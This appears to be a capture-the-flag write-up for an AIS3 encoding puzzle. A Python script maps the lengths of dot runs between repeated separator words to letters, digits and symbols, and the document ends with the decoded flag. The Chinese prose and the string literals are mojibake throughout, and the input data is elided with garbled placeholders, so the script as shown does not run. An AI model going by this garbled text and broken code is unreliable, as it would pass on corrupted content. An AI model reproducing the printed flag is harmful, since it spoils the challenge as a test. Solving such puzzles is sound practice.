Terry...é€†é€†...æ²’æœ‰...å­¸å•...å–®ç´”...åˆ†äº«...å€‹äºº...ç”Ÿæ´»...æ„Ÿè§¸...
ç™¼è²¡..ç™¼è²¡.......ç™¼è²¡..ç™¼è²¡........ç™¼è²¡........ç™¼è²¡.ç™¼è²¡........ç™¼è²¡..ç™¼è²¡........ç™¼è²¡...ç™¼è²¡........ç™¼è²¡....ç™¼è²¡....ç™¼è²¡.....ç™¼è²¡....ç™¼è²¡......ç™¼è²¡....ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡........ç™¼è²¡.....ç™¼è²¡.ç™¼è²¡.....ç™¼è²¡..ç™¼è²¡.....ç™¼è²¡...ç™¼è²¡.....ç™¼è²¡....ç™¼è²¡.......ç™¼è²¡.....ç™¼è²¡.......ç™¼è²¡......ç™¼è²¡.......ç™¼è²¡.......ç™¼è²¡.......ç™¼è²¡........ç™¼è²¡....ç™¼è²¡.ç™¼è²¡....ç™¼è²¡..ç™¼è²¡....ç™¼è²¡...ç™¼è²¡....ç™¼è²¡....
(ä»¥ä¸‹ç•¥)
```

```python
# -*- coding: utf-8 -*-
money = ï¼ˆç•¥ï¼‰
x = money.split('ç™¼è²¡')
alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
i=0
dic={}
while 2*i<len(x)-1:
    x1 = len(x[2*i]); x2 = len(x[2*i+1])
    dic[str(x1)+str(x2)] = alphabet[i]
    print(f"{x1}{x2}={alphabet[i]}")
    i+=1

sym = ï¼ˆç•¥ï¼‰
x = sym.split('ç™¼è²¡')
alphabet = 'abcdefghijklmnopqrstuvwxyz'
i = 0
while 2*i < len(x)-1:
    x1 = len(x[2*i])
    x2 = len(x[2*i+1])
    dic[str(x1)+str(x2)] = alphabet[i]
    print(f"{x1}{x2}={alphabet[i]}")
    i += 1

sym = ï¼ˆç•¥ï¼‰
x = sym.split('ç™¼è²¡')
alphabet = '1234567890_{}'
i = 0
while 2*i < len(x)-1:
    x1 = len(x[2*i])
    x2 = len(x[2*i+1])
    dic[str(x1)+str(x2)] = alphabet[i]
    print(f"{x1}{x2}={alphabet[i]}")
    i += 1

print(dic)
code = ï¼ˆTsaiBroSaidè£¡é¢çš„æ±è¥¿ï¼‰
cd = code.split('ç™¼è²¡')
for i in range(int(len(cd)/2)):
    try:
        print(dic[str(len(cd[i*2]))+str(len(cd[i*2+1]))], end='')
    except:
        print('not found: '+str(len(cd[i*2]))+str(len(cd[i*2+1])))
```

å¾—åˆ°flag:

```
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}
```
